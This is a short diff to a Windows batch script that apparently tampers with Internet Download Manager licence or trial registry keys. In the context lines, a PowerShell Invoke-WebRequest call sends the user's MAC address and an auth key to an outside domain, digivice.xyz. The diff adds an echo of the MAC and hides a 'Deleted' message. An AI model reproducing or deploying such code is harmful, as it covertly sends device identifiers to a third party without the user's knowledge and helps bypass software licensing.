@@ -359,6 +359,7 @@ if not defined _error if [%lockedkeys%] GEQ [7] (
 
 :: i modified here
 :: hit url to update scripting status
+echo %userMacAdd%
 powershell -command "(Invoke-WebRequest -Uri 'https://digivice.xyz/update/status?product=idm&status=complete&key=!authKey!&mac=!userMacAdd!')"
 
 
@@ -628,7 +629,7 @@ reg delete %reg% /f %nul%
 
 if [%errorlevel%]==[0] (
 set "reg=%reg:"=%"
-echo Deleted - !reg!
+::echo Deleted - !reg!
 ) else (
 set "reg=%reg:"=%"
 set _error=1
